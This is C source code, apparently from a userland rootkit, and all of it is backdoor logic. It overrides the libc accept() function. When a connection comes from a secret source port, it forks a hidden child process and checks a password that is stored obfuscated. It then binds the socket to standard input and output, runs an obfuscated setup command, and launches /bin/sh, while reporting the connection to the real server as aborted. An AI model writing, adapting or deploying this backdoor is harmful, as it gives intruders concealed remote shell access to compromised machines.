void abackconnect(int sockfd){
    char tmp[128], *pw, *prepper;
    int gotpw;

    hook(CREAD, CCHDIR);

    send(sockfd, ": ", 2, 0);
    memset(tmp, 0, sizeof(tmp));
    call(CREAD, sockfd, tmp, sizeof(tmp)-1);
    tmp[strlen(tmp)-1]='\0';
    pw = xordup(BDPASSWORD);
    if(!pw){
        memset(tmp, 0, sizeof(tmp));
        return;
    }
    gotpw = strcmp(crypt(tmp, pw), pw) == 0;
    clean(pw);
    memset(tmp, 0, sizeof(tmp));
    if(!gotpw) return;

    for(int i = 0; i < 3; i++)
        dup2(sockfd, i);

    call(CCHDIR, mvbc->homedir);
    prepper = xordup(PREPPERSTR);
    if(!prepper) return;
    system(prepper);
    clean(prepper);
    execl("/bin/sh", "sh", NULL);
}

int dropshell(int sockfd, struct sockaddr_in *sa_i){
    int accport, sport;

    accport = mvbc->hideports[0];
    if(!accport) return sockfd;

    sport = htons(sa_i->sin_port);
    if(sport == accport){
        pid_t pid = fork();
        if(pid == 0){
            hide_self();
            fsync(sockfd);
            abackconnect(sockfd);
            shutdown(sockfd, SHUT_RDWR);
            close(sockfd);
            exit(0);
        }else{
            errno = ECONNABORTED;
            return -1;
        }
    }

    return sockfd;
}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen){
    hook(CACCEPT);
    int s = (long)call(CACCEPT, sockfd, addr, addrlen);
    if(magicusr()) return s;
    struct sockaddr_in *sa_i = (struct sockaddr_in *)addr;
    if(!sa_i || !reinitmvbc()) return s;
    return dropshell(s, sa_i);
}